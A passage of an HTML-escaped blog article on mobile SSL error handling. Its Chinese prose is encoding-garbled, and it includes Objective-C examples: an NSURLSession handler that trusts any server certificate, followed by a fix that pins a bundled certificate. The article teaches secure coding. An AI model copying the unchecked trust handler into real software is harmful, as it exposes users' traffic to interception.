            &lt;span class=&quot;n&quot;&gt;NSString&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSBundle&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mainBundle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;pathForResource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&quot;random-org&quot;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ofType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&quot;der&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;NSData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;dataWithContentsOfFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;equal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cert1&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isEqualToData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cert2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;equal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;

            &lt;span class=&quot;c1&quot;&gt;// The only good exit point&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;useCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
                        &lt;span class=&quot;nl&quot;&gt;forAuthenticationChallenge:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// Bad dog&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;cancelAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ËôïÁêÜÊñπÂºèËàáÂâçÈù¢ÁöÑ Android ÊÉÖÊ≥Å2È°ûÂêåÔºåÂÅö‰∫Ü certificate pinning„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;ios-ÈåØË™§ËôïÁêÜÊÉÖÊ≥Å3&quot;&gt;iOS ÈåØË™§ËôïÁêÜÊÉÖÊ≥Å3&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;URLSession&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSession&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;session&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;didReceiveChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt;
  &lt;span class=&quot;nf&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeDisposition&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                              &lt;span class=&quot;n&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;credential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;NSURLProtectionSpace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;SecTrustRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeUseCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengePerformDefaultHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ËàáÂâçÈù¢ NSURLConnection ÁöÑÊÉÖÊ≥ÅÈ°ûÂêåÔºåÂè™ÊòØÈÄôË£°‰ΩøÁî®Âà∞ÁöÑÊòØ iOS7  Êñ∞Â¢ûÁöÑ NSURLSession ÂÖÉ‰ª∂„ÄÇÂ∞çÊáâÁöÑËôïÁêÜÊñπÂºèÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;URLSession&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSession&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;session&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;didReceiveChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt;
  &lt;span class=&quot;nf&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeDisposition&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                              &lt;span class=&quot;n&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;credential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;authenticationMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;SecTrustRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;OSStatus&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustEvaluate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errSecSuccess&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeCancelAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localCertData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;dataWithContentsOfFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSBundle&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mainBundle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
                                                   &lt;span class=&quot;nl&quot;&gt;pathForResource:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&quot;random-org&quot;&lt;/span&gt;
                                                            &lt;span class=&quot;nl&quot;&gt;ofType:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&quot;der&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]];&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;SecCertificateRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remoteServerCert&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustGetCertificateAtIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;CFDataRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remoteCertData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecCertificateCopyData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remoteServerCert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isMatch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localCertData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isEqualToData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__bridge&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remoteCertData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;CFRelease&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remoteCertData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeUseCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeCancelAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengePerformDefaultHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;Â∞ç-webview-ÁöÑ‰∏Ä‰∫õË£úÂÖÖ&quot;&gt;Â∞ç WebView ÁöÑ‰∏Ä‰∫õË£úÂÖÖ&lt;/h4&gt;
&lt;p&gt;Âú®Â∞ç WebView ÂÅöËôïÁêÜ‰∏äÔºåÈô§‰∫ÜÂ∞ç SSL ÈåØË™§Áõ¥Êé•Áï•ÈÅéÂ§ñÔºåÁõÆÂâçÁÑ°Ë´ñÊòØÂú® Android ÈÇÑÊòØ iOS ‰∏äÔºåSDK API ÈÉΩÂ∞öÊú™Áõ¥Êé•Êèê‰æõÊñπÊ≥ïËÆìÈñãÁôºËÄÖËÉΩÂú® SSL Handshake ÁöÑÈÄî‰∏≠‰Ωú Server Certificate Pinning„ÄÇÂÖ∂‰∏≠‰∏ÄÂÄãÊõø‰ª£ÊñπÊ≥ïÊòØÔºåÂà©Áî®ÂÖ∂‰ªñËÉΩÂ§†‰Ωú Pinning ÁöÑÂÖÉ‰ª∂Â∞áË≥áÊñô‰∏ãËºâÂõû‰æÜÔºåÊé•ËëóÊääË≥áÊñôÂÇ≥Âà∞ WebView ÈÄ≤Ë°åËÆÄÂèñÔºåÈÅøÈñãÂéüÊú¨Áî® WebView Áõ¥Êé•Ë®≠ÂÆöÈÄ£Á∑öÁ∂≤ÂùÄ„ÄÇËòãÊûúÂÖ¨Âè∏ÊúâÊèê‰æõÈÄôÁ®ÆËôïÁêÜÁöÑ&lt;a href=&quot;https://developer.apple.com/library/ios/samplecode/CustomHTTPProtocol/Introduction/Intro.html&quot;&gt;ÁØÑ‰æã&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÁµêË™û&quot;&gt;ÁµêË™û&lt;/h3&gt;
&lt;p&gt;Êú¨‰æÜÁÇ∫‰∫ÜÊèêÈ´òÂÆâÂÖ®ÊÄßËÄå‰ΩøÁî®ÁöÑ SSL Âä†ÂØÜÈÄ£Á∑öÔºåÂçªÁî±ÊñºÁ®ãÂºèËôïÁêÜ‰∏çÁï∂ËÆìÂéü‰æÜÁöÑ‰øùË≠∑ÂΩ¢ÂêåËôõË®≠„ÄÇËßÄÂøµ‰∏çË∂≥ËàáÁÇ∫ÁØÄÁúÅÊôÇÈñìËÄåÊ≤íÂÅöÂ•ΩËôïÁêÜÁõ∏‰ø°ÊòØ‰∏ªË¶ÅÂéüÂõ†„ÄÇÁ∂≤Ë∑Ø‰∏äÂ§ßÈáèÁöÑÊñáÁ´†Âú®ÂºïÊåáÈñãÁôºËÄÖÁï•ÈÅéÈåØË™§Ë≠¶ÂëäÁöÑÊôÇÂÄôÔºåÂçªÊ≤íÊúâÊèêÈÜí‰ªñÂÄëÈÄôÊ®£ÂÅöÂ∏∂‰æÜÁöÑÂΩ±ÈüøÔºå‰πüÂä©Èï∑‰∫Ü‰∏çÁï∂ËôïÁêÜÁöÑÁôºÁîü„ÄÇ&lt;/p&gt;

&lt;p&gt;Èô§‰∫Ü SSL ËôïÁêÜÂïèÈ°åÂ§ñÔºåÊâãÊ©üÊáâÁî®Á®ãÂºèÈñãÁôºÈÇÑÊúâË®±Â§öË¶ÅÊ≥®ÊÑèÁöÑÂÆâÂÖ®ÂïèÈ°åÔºåÂÉèÊòØ OWASP ÂàóÂá∫ÁöÑ &lt;a href=&quot;https://www.owasp.org/index.php/Projects/OWASP_Mobile_Security_Project_-_Top_Ten_Mobile_Risks&quot;&gt;Top 10 Mobile Risks&lt;/a&gt;„ÄÅÁî±Êó•Êú¨Êô∫ÊÖßÂûãÊâãÊ©üÂÆâÂÖ®ÂçîÊúÉÁôº‰Ωà &lt;a href=&quot;http://www.jssec.org/report/android_securecoding_en_20140801.html&quot;&gt;Android Application Secure Design/Secure Coding Guidebook&lt;/a&gt; Ë£°Èù¢ÊâÄÂª∫Ë≠∞ÁöÑ„ÄÇÈñãÁôºÂïÜÊúâË≤¨‰ªªÂÅöÂ•ΩÂÆâÂÖ®ÊääÈóú‰ª•‰øùÈöúÈõôÊñπÊ¨äÁõä„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÂèÉËÄÉ&quot;&gt;ÂèÉËÄÉ&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://android-ssl.org&quot;&gt;Rethinking SSL Development in an Appified World&lt;/a&gt;&lt;/li&gt;
